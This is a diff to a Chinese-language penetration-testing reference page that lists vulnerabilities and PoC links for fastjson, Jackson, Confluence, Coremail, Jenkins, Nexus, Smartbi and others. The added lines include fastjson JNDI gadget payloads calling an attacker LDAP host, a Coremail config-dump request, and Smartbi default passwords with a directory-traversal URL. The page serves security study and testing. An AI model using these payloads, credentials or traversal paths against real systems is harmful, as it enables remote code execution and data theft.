+    {"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://192.168.80.1:1389/Calc"}
+
+    {"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","metricRegistry":"ldap://192.168.80.1:1389/Calc"}
+
+    {"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup","jndiNames":"ldap://192.168.80.1:1389/Calc"}
+
+    {"@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig","properties": {"@type":"java.util.Properties","UserTransaction":"ldap://192.168.80.1:1389/Calc"}}
+    ```
+
+**fastjson < 1.2.66 版本拒绝服务漏洞**
+
+- 影响范围
+    - 1.2.36 - 1.2.62
+
+- 文章
+    - [fastjson < 1.2.66 版本最新漏洞分析](https://mp.weixin.qq.com/s/RShHui_TJeZM7-frzCfH7Q)
 
 ### Jackson
 
@@ -2024,9 +2344,27 @@ FasterXML Jackson 是美国 FasterXML 公司的一款适用于 Java 的数据处
 - POC | Payload | exp
     - [fairyming/CVE-2020-9548](https://github.com/fairyming/CVE-2020-9548)
 
+**CVE-2020-11113 远程代码执行漏洞**
+- 影响版本
+    - Jackson-databind  < 2.9.10.4
+
+- 文章
+    - [Jackson-databind-2670远程代码执行漏洞简单分析](https://xz.aliyun.com/t/7506)
+
+### Xstream
+
+**文章**
+- [XStream反序列化组件攻击分析](https://www.angelwhu.com/paper/2016/03/15/xstream-deserialization-component-attack-analysis/#0x00-XStream%E7%BB%84%E4%BB%B6%E5%8A%9F%E8%83%BD)
+
 ---
 
 ## 其他
+### Ghostscript
+
+**CVE-2019-6116 沙箱绕过（命令执行）漏洞**
+- POC | Payload | exp
+    - [GhostScript 沙箱绕过（命令执行）漏洞（CVE-2019-6116）](https://github.com/vulhub/vulhub/tree/master/ghostscript/CVE-2019-6116)
+
 ### webuploader
 
 > 项目地址 : https://github.com/fex-team/webuploader
@@ -2052,11 +2390,30 @@ FasterXML Jackson 是美国 FasterXML 公司的一款适用于 Java 的数据处
 
 ---
 
+## Cacti
+
+**CVE-2020-8813 Cacti v1.2.8 远程命令执行漏洞**
+- 文章
+    - [Cacti v1.2.8 authenticated Remote Code Execution (CVE-2020-8813)](https://shells.systems/cacti-v1-2-8-authenticated-remote-code-execution-cve-2020-8813/)
+
+---
+
 ## Confluence
 
 > 官网 : https://www.atlassian.com/software/confluence
 
 Confluence 是一个专业的企业知识管理与协同软件，也可以用于构建企业 wiki。使用简单，强大的编辑和站点管理特征能够帮助团队成员之间共享信息、文档协作、集体讨论，信息推送。
+
+**CVE-2019-3394 Confluence 文件读取漏洞**
+- 文章
+    - [Confluence 文件读取漏洞(CVE-2019-3394)分析](https://paper.seebug.org/1025/)
+
+**CVE-2019-3396 Confluence Wiki 远程代码执行**
+- 文章
+    - [Confluence 未授权 RCE (CVE-2019-3396) 漏洞分析](https://paper.seebug.org/884/)
+
+- POC | Payload | exp
+    - [jas502n/CVE-2019-3396](https://github.com/jas502n/CVE-2019-3396)
 
 **CVE-2019-3398 Atlassian Confluence Download Attachments Remote Code Execution**
 - 简介
@@ -2071,6 +2428,24 @@ Confluence 是一个专业的企业知识管理与协同软件，也可以用于
 
 - POC | Payload | exp
     - https://www.peerlyst.com/posts/cve-2019-3398-atlassian-confluence-download-attachments-remote-code-execution-juniper-networks?utm_source=twitter&utm_medium=social&utm_content=peerlyst_post&utm_campaign=peerlyst_shared_post
+
+---
+
+## Coremail
+
+> 官网 : https://www.coremail.cn/
+
+Coremail 论客邮件系统于2000年首发，是中国第一套中文邮件系统。是网易等运营商至今一直使用的邮件系统，也是政府机关、大学、金融机构、上市公司及其他大型企业（包含国有企业）广泛使用的邮件系统。
+
+**工具**
+- [dpu/coremail-address-book](https://github.com/dpu/coremail-address-book) - Coremail邮件系统组织通讯录一键导出
+
+**敏感文件泄露漏洞**
+- POC | Payload | exp
+    ```
+    /mailsms/s?func=ADMIN:appState&dumpConfig=/
+    ```
+    - [yuxiaoyou123/coremail-exp](https://github.com/yuxiaoyou123/coremail-exp)
 
 ---
 
@@ -2136,10 +2511,16 @@ Jenkins 的漏洞参考 https://jenkins.io/security/advisories/
 - [Jenkins 搭建](../../../运维/Linux/Power-Linux.md#Jenkins)
 
 **文章**
-- [gquere/pwn_jenkins: Notes about attacking Jenkins servers](https://github.com/gquere/pwn_jenkins)
-- [petercunha/jenkins-rce](https://github.com/petercunha/jenkins-rce)
 - [Hacking Jenkins Part 1 - Play with Dynamic Routing](https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/)
 - [Hacking Jenkins Part 2 - Abusing Meta Programming for Unauthenticated RCE!](https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/)
+- [Jenkins RCE漏洞分析汇总](http://www.lmxspace.com/2019/09/15/Jenkins-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%B1%87%E6%80%BB/)
+
+**资源**
+- [gquere/pwn_jenkins: Notes about attacking Jenkins servers](https://github.com/gquere/pwn_jenkins)
+- [petercunha/jenkins-rce](https://github.com/petercunha/jenkins-rce)
+
+**工具**
+- [blackye/Jenkins](https://github.com/blackye/Jenkins) - Jenkins漏洞探测、用户抓取爆破
 
 **未授权访问漏洞**
 - 简介
@@ -2366,6 +2747,13 @@ Jupyter Notebook（此前被称为 IPython notebook）是一个交互式笔记�
     - [mpgn/CVE-2019-7238](https://github.com/mpgn/CVE-2019-7238)
     - [jas502n/CVE-2019-7238](https://github.com/jas502n/CVE-2019-7238)
 
+**CVE-2020-10199/CVE-2020-10204**
+- 文章
+    - [Nexus Repository Manager(CVE-2020-10199/10204)漏洞分析及回显利用方法的简单讨论](https://www.cnblogs.com/magic-zero/p/12641068.html)
+
+- POC | Payload | exp
+    - [aleenzz/CVE-2020-10199](https://github.com/aleenzz/CVE-2020-10199)
+
 ---
 
 ## noVNC
@@ -2466,6 +2854,21 @@ PHP-FPM 是一个 PHPFastCGI 管理器，对于 PHP 5.3.3 之前的 php 来说�
 
 ---
 
+## Smartbi
+
+**常见口令**
+- demo/demo
+- manager/demo
+- admin/admin
+- admin/manager
+- admin/2manager
+
+**Tips**
+- http://127.0.0.1:18080/smartbi/vision/config.jsp 可能未修改密码或者密码为 manager
+- http://127.0.0.1:18080/smartbi/vision/chooser.jsp?key=CONFIG_FILE_DIR&root=C%3A%2F 进入后台目录遍历
+
+---
+
 ## Supervisord
 
 > 项目地址 : https://github.com/Supervisor/supervisor
@@ -2560,3 +2963,4 @@ zabbix 是一款服务器监控软件,其由 server、agent、web 等模块组�
 
 - 文章
     - [zabbix latest.php SQL注入漏洞 (CVE-2016-10134) ](https://vulhub.org/#/environments/zabbix/CVE-2016-10134/)
+    - [记一次zabbix安装及漏洞利用getshell全过程 ](https://xz.aliyun.com/t/6874)
